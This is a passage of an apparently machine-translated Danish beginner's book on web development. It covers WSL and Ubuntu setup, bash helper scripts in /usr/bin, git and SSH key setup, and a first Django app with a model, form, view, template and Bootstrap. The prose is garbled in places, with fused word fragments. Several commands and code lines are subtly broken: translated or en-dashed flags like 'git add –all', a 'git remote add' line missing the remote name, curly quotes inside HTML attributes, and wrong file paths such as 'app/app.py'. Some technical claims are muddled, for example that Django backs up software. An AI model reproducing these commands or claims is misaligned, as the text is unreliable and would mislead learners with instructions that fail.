nok. At binde din software for tæt på en andens software, som en e -mail -service eller tekstmeddelelsestjeneste, er ikke nok til at gøre din software sikker eller nogens (ethvert websted, du bruger).
Enhver, der bygger software, der er upåklageligt sikker, har en vis fornemmelse af, hvad dette indebærer. Software er i sagens natur usikker, fordi de enheder og konti, vi bruger til at få adgang til det, ikke altid er til rådighed, de kan være i hænderne på enhver med syg forsæt på softwaren og derfor kan udgøre en risiko for selve softwaren. Dette er noget af fokus i denne bog. En netværkscomputer er som standardSikret med en lang nøgle -token, kaldet og SSH eller Secure Shell Key, og er ellers bedst sikret med en webserver, fordi webserveren giver åben adgang såvel som avancerede sikkerhedsværktøjer, der kører på selve serveren. Webserveren har adgang til brugerens webbrowser, som uden tvivl er den mest kraftfulde del af brugerens enhed, fordi det er det sted, hvor brugeren kan få adgang til netværkssoftware. Dette værktøjssæt kan gengive tekst, de websider, du ser, og kan også optage billeder, lyd og video (som et foto af et ansigt eller et stats -id), kan læse og skrive til Bluetooth -radioenheder og kan læse og skrive til nær felt Transponder -tags, billige nøglekort, fobs, klistermærker, ringe og endda chipimplantater med unikke serienumre, der kan læses og skrives til med data genereret og valideret af en webserver bundet til internettet sted. Ved hjælp af alle de værktøjer, du har til rådighed, med denne bog vil du udstyre dig selv med viden til at opbygge et sikkert websted og samlet set aURE Networked Computer System, der fungerer for dig, gør dit bud og ser og føles rigtigt.


Hvor skal man starte:
Du er velkommen til at springe forbi det afsnit, jeg begynder denne bog med eller ethvert afsnit, til den nøjagtige kode, du har brug for, især hvis du har erfaring med kodning før eller et af de nævnte værktøjer, jeg vil beskrive i detaljer i denne bog som såvel som at dokumentere brugssager og praktiske eksempler deraf. Hvis du ikke har erfaring med at skrive kode, kan jeg varmt anbefale, at du læser al denne bog, og især anbefaler, at du læser de foregående sektioner, for at sikre dig, at denne bog er den rigtige for dig. Hvis denne bog ikke er rigtig for dig, skal du overveje at give den til en ven eller slægtning, der måske er interesseret i at lære om webudvikling selv, og endda overveje at låne den tilbage og lære af dem for at udfylde huller lærer eller andre lærere gjorde før mig. Start hvor du vil, vil hver del af denne bog være nyttig, hvis du har til hensigt at opbygge en nyttigPP, og overvej, at de bedste apps er bygget med slutbrugeren i tankerne: Kend din kunde. Nu kender du mig, du kender denne bog, og du er klar til at begynde. For at starte, skal du gribe en computer (endda den billigste bærbare computer fra en kassebutik, Amazon eller et gammelt desktop, og indstille den på en måde, der fungerer for dig.

Hvordan man læser denne bog:
Tekst fremhævet, angiver, at teksten hører hjemme i en kommandoprompt, hvor du vil skrive den kode, du kører. Kommandoprompten er stærkt tastaturfokuseret og kræver lidt til ingen klik, der fremskynder din arbejdsgang og gør tingene lettere for dig.

Kom godt i gang:
Lad os dykke ind. Vi starter med at bygge kode på en lokal maskine og begynde uden at bygge et websted, der er tilsluttet internettet. Dette er mere sikkert at starte med, koster intet og er let for dig. Afhængigt af dit operativsystem vil det være lidt anderledes at komme ind i en bash -skal. Til Mac OS anbefaler jeg at installere en virtuel maskine på dette tidspunkt, da du får den mest kompatibilitet medVirtuel maskine. Forskellige udbydere som VirtualBox og Paralells kan køre en virtuel maskine til dig, skønt det også er muligt at installere Ubuntu direkte på maskinen, hvis du foretrækker at bruge et indfødt miljø, der anbefales for at skabe en hurtig, strømlinet oplevelse. Hvis du bruger Linux eller Windows, som jeg anbefaler, skal det være ret let at oprette et projekt. Åbn din terminal, juster størrelsen, som du finder passende, og start følgende trin 2.. Hvis du bruger Windows, skal du følge trin 1.

Trin 1: - Kun Windows -brugere
I Windows, åben kommandoprompt som administrator og type 
WSL –installer
   
Trin 2: - Fortsæt her, eller spring trin 1 til her, hvis du ikke bruger Windows
I en åben terminal (afhængigt af dit operativsystem, kaldet Ubuntu i Windows, Terminal i Mac eller Linux eller et lignende navn), begynder med at oprette et projekt. Vi gør dette med mkdir -kommandoen, der opretter et bibliotek. Hvis du har brug for at oprette et bibliotek for at gemme dit projekt, som anbefales, skal du brugeCD -kommando til at ændre sig til biblioteket og og 

cd/sti/til/bibliotek - stien er mapperne (filer), der går forud for dit destinationsmappe, din standardsti er ~ eller/home/brugernavn (hvor brugernavn er dit brugernavn). For at ændre til standardmappen, skal du skrive CD eller CD ~
MKDIR -eksempel - Udskift “Eksempel” med navnet på biblioteket

Nu har du et arbejdsmappe til dit projekt. At være som det er så vigtigt at have gemt dette bibliotek, hvis du har brug for at skifte til en anden maskine eller implementere den kode, du skriver, så den er klar til internettet, vi bygger et script til at sikkerhedskopiere dit bibliotek i de næste par trin. Men at opbygge et script tager lidt kode, og koden skal automatiseres for at være så nyttig som muligt. Så lad os opbygge et script til først at opbygge scripts. Lad os starte med at oprette scriptet og gøre det eksekverbart. Vi bruger sudo, chmod og berøring til dette og kalder manuskriptet<pre class="language-bash"><code>
sudo touch /usr/bin/ascript
sudo chmod a+x /usr/bin/ascript
sudo nano /usr/bin/ascript
</code></pre>Nu har vi oprettet manuskriptet, gjort det eksekverbart og er klar til at redigere det. Nano er en teksteditor, der giver dig mulighed for at redigere tekst uden at klikke, hvilket er meget lettere end at bruge en grafisk brugergrænseflade. For at redigere en fil med Nano skal du bruge Nano og derefter stien til filen. For at lave et script, der laver et script, ligner det temmelig at lave vores script i første omgang. Vi bruger den samme kode som ovenfor og erstatter navnet på scriptet, "Ascript" med en argumentparameter, $ 1. Dette lader os kalde scriptet ved at skrive simpelthen sudo ascript Newscript, på hvilket tidspunkt vi kan oprette ethvert nyt script ved at udskifte “Newscript” med navnet på dit script. Koden i Nano skal se ud:<pre class="language-bash"><code>
sudo touch /usr/bin/$1
sudo chmod a+x /usr/bin/$1
sudo nano /usr/bin/$1
</code></pre>Og for at lukke Nano kan vi holde kontroltasten nede og trykke på X, så y for at betegne, at vi gemmer filen og rammer retur. Nu i stedet for at skrive disse tre kommandoer for at redigere et script, vil vi være i stand til at skrive sudo ascript ascript for at redigere scriptet igen. Dette fungerer! Og ethvert nyt script kan let køres ved at kalde det i skallen. Lad os gemme vores arbejde nu: Lad os skrive et backup -script for at gemme vores nye script og derefter sikkerhedskopiere det i vores projektkatalog, mens vi også sikkerhedskopierer backup -scriptet.<pre class="language-bash"><code>
sudo ascript backup
</code></pre>Nu i Nano:<pre class="language-bash"><code>
sudo cp /usr/bin/backup /path/to/directory/
sudo cp /usr/bin/ascript /path/to/directory/
</code></pre>Hvor/sti/til/bibliotek er vejen til det projekt, du oprettede med mkdir. Senere lærer vi, hvordan man kopierer gentagne stier som denne med en løkke og en liste, som er mindre kode, men lad os nu holde det enkelt og have et par linjer. For at køre dette script og sikkerhedskopiere din kode skal du gemme filen i Nano med kontrol+x, y og returnere og indtaste nedenstående i din skal<pre class="language-bash"><code>
backup
</code></pre>Hvis du overhovedet bliver bedt om en adgangskode, mens du læser denne bog og følger med i skallen, skal du indtaste din brugeradgangskode korrekt, har du tre forsøg, før du har brug for at køre kommandoen igen. Du kan bruge pilene op og ned til at køre kommandoer og redigere dem, hvis du har brug for at køre noget to gange. Enkel tryk op og ned med mellemrum for at vælge en kommando, før du redigerer kommandoen med højre, venstre pile og slet nøgle såvel som tastaturet og kører den med retur.

Tillykke! Det lykkedes dig at oprette et fantastisk backup -script, der sikkerhedskopierer to vigtige shell -scripts i dit arbejdsmappe. Vi flytter måske tingene senere, når projektet bliver større, men dette fungerer for nu. Lad os gå videre med at tage backup af i skyen, vi bruger GitHub til dette (selvom der er adskillige andre Git -løsninger til sikkerhedskopi, de er alt sammen om det samme.) Git er en Verision Control -software, der giver dig mulighed for at sikkerhedskopiere redigeringer til din software, mens du laver dem til en server, mensGør det også muligt for dig at downloade hele kopier af din software bag en adgangskode eller nøgle. Det er medvirkende til at gemme din software, især når vi migrerer til sikrede Linux -forekomster, der undertiden går i stykker, når en enkelt kodelinje mislykkes, hvilket efterlader dig låst, mens din kode muligvis ikke er sikkerhedskopieret, hvis du ikke får en chance for at støtte den op automatisk, som vi vil dække.

Hvis du ikke allerede bruger en Ubuntu -virtuel maskine på dette tidspunkt, anbefaler jeg at bruge en Ubuntu -virtuel maskine på dette tidspunkt, fordi det vil gøre dit liv lettere, når jeg installerer alle de nødvendige pakker for at opbygge et arbejdswebsted og præform dybt læring operationer på din computer. Vi flytter koden til en webserver i den nærmeste fremtid, men vi vil sikre os, at der er mindst et par lag af sikkerhed bag vores webserver, der er modstandsdygtige over for phishing, og ansætter et antal Linux -pakker for at gøre denne. Hvis du stadig vil bruge Mac OS, er du velkommen til at søge og installereE Nødvendige pakker online, men der er muligvis ikke alternativer til hver pakke, denne bog eller serie vil dække.

Lad os tilføje et par kommandoer til at forpligte vores arbejde med backup -scriptet ved at køre kommandoen sudo ascript<pre class="language-bash"><code>
# ...
git add –all
git commit -m “backup”
git push -u origin master
</code></pre>Endnu en gang skal du kontrollere X for at gemme.

Nu er vi nødt til at lave en gang -konfiguration til dette projekt. Fordi det snart vil være et GIT -projekt, behøver vi ikke at skrive enhver kommando hver gang vi implementerer fra et Git -arkiv, men vi får fat på dette, når vi skriver vores implementeringsskripts. For at starte, lad os sørge for, at vi er i det rigtige bibliotek og initialiserer Git -lageret og genererer SSH -nøgler.<pre class="language-bash"><code>
cd /path/to/directory
git init
git branch -m master
ssh-keygen
</code></pre>Når vi skriver ssh-tasten, skal den nye nøgle gemmes i hjemmemappen under en mappe kaldet .sssh. Det kaldes id_rsa.pub. Lad os finde denne nøgle og kopiere den. At se det,<pre class="language-bash"><code>
cd ~
cat .ssh/id_rsa.pub
</code></pre>Kopier den tekst, der returneres af den sidste kommando, og opret en konto hos din GIT -udbyder (ideelt GitHub), før du tilføjer SSH -tasten til din konto. Når du har en konto, skal du klikke på den øverste højre menu og indtaste indstillinger, før du tilføjer din SSH -nøgle i SSH- og GPG -nøgler under adgang i menuen. Vælg Tilføj en SSH -nøgle, og tilføj din ved at indsætte den ind og give den en titel, inden du gemmer og vender tilbage til GitHub for at oprette et nyt depot. Dette ligner for andre GIT -udbydere, du bliver nødt til at læse deres dokumentation. I den nye depotkonfiguration skal du give dit depot et beskrivende navn og beslutte, om du vil offentliggøre det, og sørg for at konfigurere endnu ikke filer til optagelse. Når depotet er oprettet, skal du kopiere klonen med SSH URL og indsætte den i følgende kommando.<pre class="language-bash"><code>
git remote add git://… (your remote URL)
</code></pre>Nu kan du flytte tilbage til dit depot med CD, du er bekendt med dette. Prøv dit backup -script nu med backup

Stor! Nu kan vi virkelig få kodning. Lad os installere Django nu, hvor vi har et godt greb om bash og git. Django vil lade os automatisk sikkerhedskopiere vores software, Bash kan også gøre dette, men Django skal have en enklere mere sikker implementering (den kan deaktiveres og konfigureres lettere).

For at installere software i Ubuntu bruger vi kommandoen sudo apt-get. Lad os først opdatere og opgradere den software, vi allerede havde. Dette kan gøres med sudo apt-get-opdatering og sudo apt-get opgradering -y. Lad os derefter installere Python og vores virtuelle miljø, hjemmet til vores kode, med følgende kommando: sudo apt-get installer python-is-python3 python3-venv

Dette er alt hvad du behøver for at komme i gang med Django med hensyn til softwareinstallationer i Ubuntu -instansen. For Windows og Linux skal dette være ret ligetil, men for Mac kan du muligvis installere en virtuel maskine ogLinux på det ved hjælp af et gratis eller betalt virtuelt miljø som VirtualBox eller Paralells desktop og genskabe trinnene ovenfor for at opsætte et Ubuntu -miljø. Ubuntu er kritisk i dette tilfælde, fordi det er softwaren, som websteder kører, og det giver dem mulighed for at være vært for websteder med al den ovennævnte software.

Lad os grave ind i Django.

I vores bibliotek igen med<pre class="language-bash"><code>
python -m venv venv # Opretter det virtuelle miljø, hvor koden er gemt
source venv/bin/activate # Aktiverer det virtuelle miljø
pip install Django
django-admin startproject mysite . # Hvor Mysite er det projekt, jeg starter i mit nuværende bibliotek.
</code></pre>Django er lige ved at komme os i gang, fordi Django er vært for webserveren og gør alt, hvad vi har brug for for at få et grundlæggende lokalt websted i gang. Nu hvor vi har Django installeret, lad os redigere indstillingerne lidt for at få det til at fungere, hvordan vi har brug for. Lad os først oprette en ny app<pre class="language-bash"><code>
python manage.py startapp feed
</code></pre>Du vil bemærke, at den første app kaldes Feed. Appen skal kaldes, hvad du vil, og vi opretter nye apps, men navnet på hver app skal være konsistent, hver gang appen henvises til i koden. For at tilføje en ny app vil vi altid redigere indstillingerne. Brug af nano,<pre class="language-bash"><code>
nano app/settings.py
</code></pre>I indstillingerne skal du finde installeret_apps og opdele [] i 3 linjer. Brug fire mellemrum på den tomme midtlinie, tilsæt 'feed' eller navnet på din app. Dette afsnit af indstillingerne.py skal se ud:<pre class="language-python"><code>
INSTALLED_APPS = [
    'feed',
]
</code></pre>Før vi glemmer, lad os teste, at Django fungerer. Ved hjælp af kommandoen Python Manage.Py Runserver 0.0.0.0:8000 kan vi køre serveren og derefter navigere i en webbrowser på computeren, der kører koden til http: // localhost: 8000 og se et eksempel på webside (det fungerer!) Afslut serveren med kontrol C, det samme som enhver anden kommando.

Lad os nu grave i at skrive nogle Python -kode. Django har tre hovedkomponenter, som alle sammen kører af kode. Komponenterne kaldes model, visning og skabelon, og hver er på henholdsvis et højere og lavere niveau, før websiden leveres til brugeren.

Modellen er den kode, der gemmer information i databasen til hentning, sortering og gengivelse.

Udsigten beslutter, hvordan modellen gengives, manipuleres og ændres, næsten enhver visning vil bruge en model direkte.

Skabelonen er HTML -koden med nogle ekstra klokker og fløjter kaldet skabelonsprog. Skabelonen gengives af det synspunkt, hvor den er fyldt med Python -kode ogKontekst såsom modeller og information (usuallstrenge og heltal) fra visningen.

Django har også andre komponenter, herunder men ikke begrænset til:

Indstillinger, der konfigurerer appen, som vi diskuterede.

URL'er, som er mønstre, som brugeren følger for at få adgang til specifikke dele af webapplikationen.

Formularer, der definerer, hvordan oplysninger, der sendes til serveren, håndteres og gengives til databasen såvel som til brugeren. Dette er grundlaget for behandling af information på serversiden og kan acceptere enhver form for information, som computerlagre, især tekststrenge, tal og ægte/falske boolere (normalt afkrydsningsfelter).

Skabeloner, der er HTML -kode og skabelonsprog og bro mellem kløften mellem Python og HTML, hvilket betyder, at Python -oplysninger kan betjenes som HTML -kode, som enhver kan få adgang til og kan sikre et websted med begrænset adgang, mens Python -kode er tilgængelig for internettet og nyttigt til forskellige formål på en ekstern enhed, der ikke gør deteed til at være i nærheden af ​​serveren.

Statiske filer, som normalt er JavaScript, og det er biblioteker, som serveren serverer og er forbundet med skabelonen.

Mediefiler, som serveren serverer eller er eksternt vært, eller bare skrevet til serveren, før de behandles og sendes til en anden server (en spand) til hosting.

Middleware, som er kodestykker, der køres på samme tid som enhver visning og betragtes som "inkluderet" i visningen.

Kontekstprocessorer, der behandler konteksten for hver visning og bruges til at tilføje ekstra kontekst.

Tests, der validerer, at brugeren eller anmodningen overfører visse krav, før visningen er gengivet.

Forbrugere, der dikterer, hvordan WebSockets håndterer og reagerer på kommunikation.

Admin, der bruges til at registrere modeller, så de kan manipuleres detaljeret inden for Django -administratorsiden, hvor databasen kan administreres gennem en grafisk grænseflade.

Selleri, der definerer asynkrone opgaver, som Django -koden kan begyndenning før straks fortsætter til den næste opgave eller kodelinje.

Django kan have mange andre komponenter, som vi vil diskutere detaljeret her. Der er masser af måder at gøre Django mere funktionelle, tilføje websockets, som er hurtige, strømlinede kommunikationskanaler, selleri, der udfører asynkrone opgaver og en række andre stykker software til at udvide Django, især i visningsfunktionerne, hvor de fleste af Koden udføres. Se funktioner er nøglen, fordi de normalt erklærer hvert stykke kode, der er specifikt for et specifikt URL -mønster, eller et afsnit af serveren.

Lad os først udforske visningsfunktioner. Se funktioner begynder med import, der angiver kode, der vil blive brugt i visningen, og defineres ved hjælp af regelmæssige funktionsdefinitioner eller klasser. De enkleste synspunkter defineres af funktionsdefinitionen def og returnerer en httpresponse med en grundlæggende skabelon. Lad os starte med at definere en grundlæggende visning for at returnere teksten “Hello World”. Husk, at hver gang du tilføjerFter en erklæring som def, hvis du, for osv. Du skal tilføje 4 pladser til hver af de foregående definitioner, du gerne vil anvende til din funktion. Vi kommer snart ind på, hvad hver af disse betyder.

Fra vores websteds bibliotek skal du redigere filen Feed/Views.py ved hjælp af Nano og tilføje følgende linjer til slutningen af<pre class="language-python"><code>
from django.http import HttpResponse

def hello(request):
    return HttpResponse('hello world')
</code></pre>Djangos HttPresponse reagerer med en tekststreng, betegnet med åbningen og lukningen '. Hver gang du videregiver information til en funktion eller klasse, som anmodning eller en streng, skal du bruge parentes (, åbning og lukning).

Dette er ikke alt, hvad vi har brug for for at se vores synspunkt endnu. Selvfølgelig har vi ikke fortalt serveren, hvor udsigten er nøjagtigt, vi er stadig nødt til at definere en sti, hvormed udsigten skal gengives. Lad os starte med at definere en grundlæggende sti i app/urls.py, og vi vil komme ind i sti -grupper senere.

Tilføj en linje i app/urls.py efter importopgørelserne efter begyndelsen af ​​importen af ​​det synspunkt, vi lige har oprettet.<pre class="language-python"><code>
from feed import views as feed_views
</code></pre>Lad os nu definere visningsmønsteret. Visningsmønstre har tre komponenter, sti -komponenten, der fortæller serveren, hvor visningen eksisterer inden for serveren (den URL -sti, som brugeren indtaster i navigationslinjen for at komme ind på websiden), visningskomponenten, hvor visningen er specificeret, og en Venligt navn på udsigten, så det er let at hente dets mønster, når du arbejder med en skabelon, især så det kan navnet ændres og opdateres om nødvendigt for at få plads til en anden visning eller påtage sig et mere logisk navn. Det giver mening at gøre tingene på denne måde og være fleksibel, fordi din kodebase vil være et stadigt skiftende miljø, der har brug for fleksibilitet og improvisation for at være værdifuld og let at arbejde med. Her er, hvordan din visning vil se ud, du kan tilføje dette til urlPatterns = [sektionen af ​​app/urls.py. Visningsmønsteret defineres med de tre komponenter beskrevet ovenfor, og en funktion kaldet sti. Dine URL -mønstre er en liste, så sørg for altid at afslutte hvert emne i demmed et komma, fordi dette adskiller hver enkelt. Hver vare skal også gå på en ny linje, igen med fire mellemrum før den, ligesom appen i indstillinger.py. Vi definerer den første komponent i visningen med en tom strengfunktion for at oprette en visning, der kører på rodkataloget på webserveren. Dine urls.py skal nu se ud<pre class="language-python"><code>
from feed import views as feed_views

urlpatterns = [
    path('', feed_views.hello, name='hello'),
]
</code></pre>Dette er grundlaget for at oprette et websted med Django, der er helt statisk. For at lave et mere dynamisk websted, hvor vi kan begynde cacheinformation, som billeder, videoer, lyd og mere, bliver vi nødt til at bruge modeller, som vi vil udforske næste. Lad os nu tjekke vores kode og køre serveren. For at kontrollere koden for fejl skal du køre:<pre class="language-bash"><code>
python manage.py check
</code></pre>Hvis der er nogen fejlmeddelelser, skal du omhyggeligt gennemgå de ændringer, du har foretaget til din app, og se, om der er noget, der skal rettes, som en ekstern eller manglende plads, en ekstra karakter, en uklasset streng, enhver skrivefejl, enhver ved et uheld Slettet karakter eller noget andet. Når du læser gennem fejlmeddelelsen (hvis du har en), skal du være i stand til at se stien til en fil, du oprettede eller redigeret sammen med et linjenummer, så se på den fil og linje og se, om du kan løse alt, hvad der er der . Hvis du har løst problemet, skal du køre ovenstående kommando igen. Når din software er klar til at køre og arbejder, vil du se output "Systemcheck identificerede ingen problemer." Nu er du klar til at gå. Kør serveren med:<pre class="language-bash"><code>
python manage.py runserver 0.0.0.0:8000
</code></pre>Åbn nu en webbrowser og naviger til http: // localhost: 8000. Du skal se teksten returneret i parentes og citater af HTTPResponse -funktionen efter din opfattelse. Dette er bare et grundlæggende eksempel, men hvis du nåede det så langt, forstår du det grundlæggende om, hvordan Linux, Bash, Python og Django fungerer. Lad os grave dybere ned i en eller anden databasemodellering og udforske kraften i en Python -klasse ved lagring af information. Derefter begynder vi at få fat i HTML og CSS, før vi gør vores websted fuldt ud med, fleksibelt og sikkert ved hjælp af JavaScript og Machine Learning.

Klasser gemmes i modellerne. Brug af Nano, rediger app/modeller.py og tilføj en ny klasse. En klasse er defineret med klassedefinitionen og overføres en superklasse, som den arver fra, i dette tilfælde modeller.model. Navnet på klassen kommer efter klassedefinitionen, og efter klassens definition a: (colon) bruges, før attributterne og funktionsdefinitionerne, der er knyttet til klassen, er betegnet nedenfor. Vores klasseBrug for et ID, vi kan bruge til at hente det og holde det unikt, og det har også brug for et tekstfelt for at gemme nogle oplysninger. Senere kan vi tilføje en tidsstempel, filer, boolere (sande eller falske definitioner, der kan hjælpe vores kode med at tage beslutninger om, hvad de skal gøre med modellen, og kan bruges til at sortere den), et eksempel på at binde modellen til en bruger, der er logget ind på serveren og mere. Lad os pakke koden ud<pre class="language-python"><code>
from django.db import models # Den import, der bruges til at definere vores klasse, og det er attributter

class Post(models.Model): # Definitionen af ​​vores klasse selv
    id = models.AutoField(primary_key=True) # ID for vores model, en automatisk genereret nøgle, der vil lade os spørge modellen, holde den unik og er nyttig, når vi er nødt til at interagere med modellen, når den er blevet oprettet.
    text = models.TextField(default='') # Attributten vores klassebutikker, i dette tilfælde, nogle tekst, som er standard til en tom streng.
</code></pre>Luk og gem filen, som vi gjorde før for at afslutte.

Der er mange andre felter og indstillinger, vi vil udforske, når vi opdaterer denne klasse, når vores app udvikler sig, men dette er de grundlæggende nødvendigheder ved at oprette en app til at sende en tekst. Imidlertid fungerer denne model ikke alene. Som beskrevet tidligere har vi brug for en brugerdefineret visning og brugerdefineret URL -mønster for at få denne model til at fungere, og vi har også brug for en formular sammen med en skabelon. Lad os udforske formularen først.

For at definere en formular skal du redigere app/formular. Py med Nano og tilføje følgende linjer. Vi har brug for to import, vores formersklasse samt den model, vi oprettede (Feed.Models.post), en klassedefinition, der ligner modellen, og et felt sammen med en underklasse kaldet meta, der definerer modellen, som formen interagerer med. Formularen kan også have en initialiseringsfunktion, der indstiller den baseret på oplysninger i anmodningen, modellen eller på anden måde, vi vil udforske dette senere.

Modelformularer er så nyttige, fordi de kan oprette en model eller også redigere en model,Så vi vil bruge dem til begge. Lad os definere en i form.py<pre class="language-python"><code>
from django import forms
from feed.models import Post

class PostForm(forms.ModelForm):
    text = forms.CharField(widget=forms.Textarea)
    class Meta:
        model = Post
        fields = ('text',)
</code></pre>Dette er det grundlæggende i, hvordan en form og model ser ud. Denne modelform kan bruges til at instantiere eller redigere et indlæg, ændre den tekst, den indeholder. Vi ser på at integrere denne formular i en visning næste. Lad os først lave migrationerne og migrere databasen, så vores kode kan interagere med modellen, når den kører. For at gøre dette skal du køre følgende kommandoer:<pre class="language-bash"><code>
python manage.py makemigrations
python manage.py migrate
</code></pre>Dette vil tage et minut at udføre, men når det først er gjort, giver det dig adgang til modellen i visningerne, middleware eller andre steder i softwaren. Lad os fortsætte med at se, hvor vi kan se vores model. Rediger feed/visninger.py og tilføj følgende kode, som nævnt. Du behøver ikke at tilføje noget efter # tegnet, at koden er kommentarer, der bruges til at betegne oplysninger om koden. Vi starter med at importere vores model i visningerne og tilføje den til en kontekst, hvor vi kan gengive den i en skabelon som en liste til visning. Dernæst tilføjer vi en skabelon, hvor vi kan gengive formularen og modellen med en knap for at oprette et nyt objekt baseret på modellen og sende den til serveren. Dette lyder kompliceret, så lad os bare tage det trin for trin. Før vi er færdige med udsigten, lad os oprette en skabelon, der bare gengiver modellen og sørger for, at vi kan se den ved at oprette et nyt indlæg i skallen. Sådan skal denne opfattelse se ud:<pre class="language-python"><code>
from feed.models import Post
from django.shortcuts import render, redirect
from django.urls import reverse

def feed(request):
    posts = Post.objects.all() # Forespørg alle indlæg i databasen indtil videre
    return render(request, 'feed/feed.html', {
        'posts': posts,
    })
</code></pre>Alt dette ser temmelig enkelt ud, indtil vi kommer til bunden. Render, den værdi, der er returneret af funktionen i stedet for i et HTTP -svar som det forrige eksempel, tager altid en anmodning som dens første input, accepterer en kontekst (i dette tilfælde indlægene i databasen), som nu kan fremsættes i skabelonen , og returnerer skabelonen defineret i funktionen. Skabelonen bliver et HTML -dokument med lidt af et sprog kaldet Jinja2, der gør Python -oplysninger til HTML. 

For at begynde at oprette skabeloner skal du lave to mapper i feed.<pre class="language-bash"><code>
mkdir feed/templates
mkdir feed/templates/feed
</code></pre>Rediger derefter en skabelon i biblioteket ovenfor, feed/skabeloner/feed, og tilføj koden til dette eksempel. Lad os se på skabelonen for dette eksempel.<pre class="language-markup"><code> 
&lt;!doctype HTML&gt;
&lt;html&gt;
&lt;body&gt;
&lt;legend&gt;Feed&lt;/legend&gt;
&lt;hr&gt;
{% for post in posts %}
&lt;p&gt;{{ post.text }}&lt;/p&gt;
{% endfor %}
&lt;/body&gt;
&lt;/html&gt;
 </code></pre>Dette er en meget simpel skabelon. Det definerer åbning og lukning af HTML -tags, et dokumenttypemærke, et kropsmærke med en legende titel, et brudmærke, der tilføjer en lille linje på tværs skabelonen. Dette er alt, hvad det kræver for at gengive indlæg, men der er endnu ingen i databasen. Lad os skabe nogle med skallen. Vi kan køre skallen med administration.py<pre class="language-bash"><code>
python manage.py shell
</code></pre>Lad os nu importere vores postmodel<pre class="language-python"><code>
from feed.models import Post
</code></pre>Dernæst opretter vi et simpelt indlæg med en streng og afslutter skallen. Strengen kan være hvad som helst, så længe det er gyldigt tekst.<pre class="language-python"><code>
Post.objects.create(text='hello world')
exit()
</code></pre>Til sidst bliver vi nødt til at tilføje et URL -mønster til vores feed. Fordi vores feed -app vil bruge flere webadresser, og vi ønsker at holde filstørrelser små, lad os oprette en lokal webadres. PY i vores feed -app, der ser sådan ud:<pre class="language-python"><code>
from django.urls import path
from . import views

urlpatterns = [
    path('', views.feed, name='feed'),
]
</code></pre>Vi bliver også nødt til at redigere urls.py i basisappen, uanset hvad vi besluttede at kalde det, var dette det første bibliotek, vi oprettede. Rediger app/app.py og tilføj følgende til URL -mønstrene<pre class="language-python"><code>
from django.urls import include # øverst

urlpatterns = [
    # ... Tidligere kode her
    path('feed/', include(('feed.urls'), namespace='feed')),
]
</code></pre>Nu, når vi kører serveren med Python Manage.Py RunServer, vil vi se den side, vi oprettede, fordi vi har modellen, visningen og skabelonen såvel som URL -mønster sammen med varer i databasen. Lad os derefter implementere den formular, vi oprettede, og begynde at oprette vores egne indlæg. Men inden vi skriver for meget kode, lad os lave en sikkerhedskopi ved hjælp af det script, vi skrev tidligere, backup. Kør dette script i skallen, vent et par øjeblikke, og al koden vil blive sikkerhedskopieret til vores git -arkiv.<pre class="language-bash"><code>
backup
</code></pre>Implementering af formularen er relativt enkel. Vi importerer vores formular, tilføjer en postanmodningshåndterer til visningen og gemmer indlægget i databasen, inden du omdirigerer til den samme visning. Vi kan bruge den omdirigeringsfunktion, vi allerede har importeret, og en anden funktion kaldet omvendt for at få URL'en til visningsmønsteret. Vi vil forespørge dette med strengen 'Feed: Feed', fordi navneområdet på det inkluderede mønster er foder, og visningen kaldes også foder.<pre class="language-python"><code>
from feed.forms import PostForm

def feed(request):
    posts = Post.objects.all() # Forespørg alle indlæg i databasen indtil videre
    if request.method == 'POST': # Håndter anmodningen om posten
        form = PostForm(request.POST) # Opret en forekomst af formularen og gem dataene på den
        if form.is_valid(): # Valider formularen
            form.save() # Gem det nye objekt
        return redirect(reverse('feed:feed')) # Omdirigere til den samme URL med en GET -anmodning
    return render(request, 'feed/feed.html', {
        'form': PostForm(), # Sørg for at videregive formularen i konteksten, så vi kan gengive den.
        'posts': posts,
    })
</code></pre>Nu skal vi opdatere skabelonen for at redegøre for den nye form. Vi kan gøre dette ved at bruge<form>Tag i HTML og gengiv formen i HTML -skabelonen med en indsendelsesknap. Vi har også brug for et CSRF -token, et token, der forhindrer eksterne websteder i at placere til formularen uden først at indlæse en side.<pre class="language-markup"><code> 
&lt;!doctype HTML&gt;
&lt;html&gt;
&lt;body&gt;
&lt;legend&gt;Feed&lt;/legend&gt;
&lt;form method=”POST”&gt;
{% csrf_token %}
{{ form }}
&lt;button type=”submit”&gt;New Post&lt;/button&gt;
&lt;/form&gt;
&lt;hr&gt;
{% for post in posts %}
&lt;p&gt;{{ post.text }}&lt;/p&gt;
{% endfor %}
&lt;/body&gt;
&lt;/html&gt;
 </code></pre>Lad os nedbryde dette. Der er en ny formklasse, et token, selve formularen og en indsendelsesknap. Temmelig enkel, men når vi ser på det, vil vi måske få det til at se bedre ud. Det fungerer, vi kan sende nye indlæg med formularen, og de gemmes nu i databasen. Der er et par ting, der foregår her. Vi bruger HTML -tags til at erklære, at dokumentet er et HTML -dokument, vi bruger et skabelon -tag ({ %… %}) til at gengive tokenet til formularen og et andet, {{…}} til at gengive formularen. Vi har også en løkke til at gengive teksten ved hjælp af blokmærker og et skabelonmærke. Blokkoder er virkelig vigtige, fordi vi kan definere, hvordan sektioner af skabelonen gengives med dem, og skabelonmærker er grundlaget for, hvordan vi sætter variabler i vores kode.

Nu er vi nødt til at få vores app til at se bedre ud, for i øjeblikket ser det virkelig grundlæggende ud. Vi kan gøre dette ved at bruge CSS, enten inline eller i klasser bundet til hvert objekt i dokumentet. CSS er virkelig rart, fordi det fortæller alt på siden, hvordan det skal se ud,Og kan få det til at se rigtig godt ud. Der er et par biblioteker, der kan gøre dette, men min personlige gå til er bootstrap. 

Bootstrap kan downloades fra deres websted,<a href="https://getbootstrap.com/" id="external-link" title="Visit this link (it will take you outside of Lotte Harper)">Getbootstrap.com/</a>. Når du er der, skal du trykke på knappen for at læse installationsdokumenterne og kopiere koden fra INCLUDE via CDN -sektionen. Du har brug for denne kode øverst på dit HTML -dokument i et tag kaldet Head. Lad os også gå videre og oprette en baseskabelon, så vi behøver ikke at genskabe disse links i hver skabelon. 

Lav et nyt bibliotek kaldet skabeloner med MKDIR -skabeloner, og rediger derefter skabeloner/base.html.

Det skal se sådan ud:<pre class="language-markup"><code> 
&lt;!doctype HTML&gt;
&lt;html&gt;
&lt;head&gt;
&lt;link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous"&gt;
&lt;script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"&gt;&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
